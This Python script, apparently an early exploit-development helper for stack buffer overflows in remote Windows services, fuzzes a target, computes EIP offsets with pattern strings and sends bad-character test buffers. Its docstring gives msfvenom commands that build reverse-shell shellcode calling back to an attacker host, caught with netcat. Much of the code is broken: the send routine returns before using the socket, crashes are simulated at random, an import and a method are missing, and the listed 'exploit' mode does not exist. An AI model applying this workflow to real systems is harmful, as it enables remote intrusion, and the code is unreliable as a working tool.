#!/usr/bin/env python3

import sys
import random
import socket
import argparse
from string import digits, ascii_uppercase, ascii_lowercase


"""
  process:
    fuzz and find buffer overflow size
    fuzz and find all badchars (\x00-\xff)
    find 'jmp esp' address (avoid badchars), preferably within application linked dll (jmp esp: # !mona jmp -r esp -cpb "\x00")
    create shellcode (prefer single stage shellcode if bufsize is large enough):
      single stage shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00" -f python EXITFUNC=thread
      multi stage shellcode: msfvenom -p windows/shell/reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00" -f python EXITFUNC=thread
    use netcat to catch incoming connection from single stage shellcode or multi/handler for staged shellcode
"""


class BUOF:
  def __init__(self, rhost, rport, lhost, lport):
    self.rhost = rhost
    self.rport = rport
    self.lhost = lhost
    self.lport = lport

  def hexdump(self, src, length=16, sep='.'):
    # https://gist.github.com/7h3rAm/5603718
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
    lines = []
    for c in range(0, len(src), length):
      chars = src[c:c+length]
      hexstr = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])
      if len(hexstr) > 24:
        hexstr = "%s %s" % (hexstr[:24], hexstr[24:])
      printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or sep) for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
      lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexstr, printable))
    return '\n'.join(lines)

  def sendrecv(self, buf):
    print(self.hexdump(buf))
    return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((self.rhost, self.rport))
    s.send(buf)
    s.recv(1024)
    s.close()

  def pcreate(self, bufsize):
    ## /usr/bin/msf-pattern_create -l
    pattern = ""
    for alphalower in ascii_lowercase:
      for alphaupper in ascii_uppercase:
        for digit in digits:
          pattern = "%s%s%s%s" % (pattern, alphalower, alphaupper, digit)
          if len(pattern) >= bufsize:
            break
    return pattern[:bufsize]

  def poffset(self, pattern):
    ## /usr/bin/msf-pattern_offset -q
    pattern = pattern.strip()
    if pattern.startswith("0x"):
      value = struct.pack("<I", int(pattern, 16)).strip("\x00")
      print(pattern, value)
    self._pcreate(10)

  def opcode_fuzz(self, bufsize):
    bufsize = 10 if not bufsize else bufsize
    while True:
      fuzbuf = self.pcreate(bufsize)
      print("[+] sending fuzbuf with pattern data of size %dB" % (bufsize))
      try:
        self.sendrecv(fuzbuf)
        print()
        if random.randint(0,5) == 3:
          raise Exception("crash!")
      except:
        print("[+] possible crash @ fuzbuf size %dB" % (bufsize))
        print("[+] rerun with '--opcode offset --eipvalue <eipvalue>' arguments to find EIP offset")
        break
      bufsize += 10

  def opcode_offset(self, bufsize, eipvalue):
    if not eipvalue:
      print("[-] need eipvalue to find offset within fuzbuf")
      return

    bufsize = 10 if not bufsize else bufsize
    maxbufsize = 10000
    while True:
      fuzbuf = self.pcreate(bufsize)
      try:
        print("[+] found eipvalue '%s' @ offset %dB within fuzbuf of size %dB" % (eipvalue, fuzbuf.index(eipvalue), bufsize))
        print("[+] rerun with '--opcode badchars --bufsize <bufsize> --badchars <\\x00\\x0a\\x0d>'")
        break
      except:
        bufsize += 10
        if bufsize >= maxbufsize:
          print("[-] eipvalue '%s' not found within fuzbuf of max size %dB" % (eipvalue, bufsize))
          break
        else:
          continue

  def opcode_badchars(self, bufsize, offset, badchars):
    if not bufsize or not offset:
      print("[-] need both bufsize and offset to find badchars")
      return

    ascii = list(map(str, "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"))
    badchars = map(str, badchars) if badchars else []
    buf = [x for x in ascii if x not in badchars]

    buf = "".join(["\x90"*16] + buf + ["\x90"*16])
    self.sendrecv(buf)


def main(args):
  buof = BUOF(rhost=args.rhost, rport=args.rport, lhost=args.lhost, lport=args.lport)

  # bufsize is optional here, will fuzz till crash if not provided, else will start fuzz from bufsize
  # will give us actual bufsize (in multiples of 10) and eipvalue (from debugger exception)
  if args.opcode == "fuzz":
    buof.opcode_fuzz(args.bufsize)

  # bufsize is optional here, will fuzz found or maxbufsize (10000)
  # will give us eip offset within fuzbuf
  elif args.opcode == "offset":
    buof.opcode_offset(args.bufsize, args.eipvalue)

  # bufsize and offset are required here
  # badchars is optional, will strip those from fuzbuf, if provided
  elif args.opcode == "badchars":
    buof.opcode_badchars(args.bufsize, args.offset, args.badchars)


if __name__ == "__main__":
  parser = argparse.ArgumentParser(description="bof (v0.1)")

  # mandatory args
  parser.add_argument('--rhost', required=True, action='store')
  parser.add_argument('--rport', required=True, action='store')
  parser.add_argument('--lhost', required=True, action='store')
  parser.add_argument('--lport', required=True, action='store')
  parser.add_argument('--opcode', required=True, action='store', help="fuzz, offset, badchars, exploit")

  # optional args
  parser.add_argument('--bufsize', required=False, default=0, type=int, action='store')
  parser.add_argument('--eipvalue', required=False, default=None, action='store')
  parser.add_argument('--offset', required=False, default=0, action='store')
  parser.add_argument('--badchars', required=False, default=None, action='store')

  main(parser.parse_args())
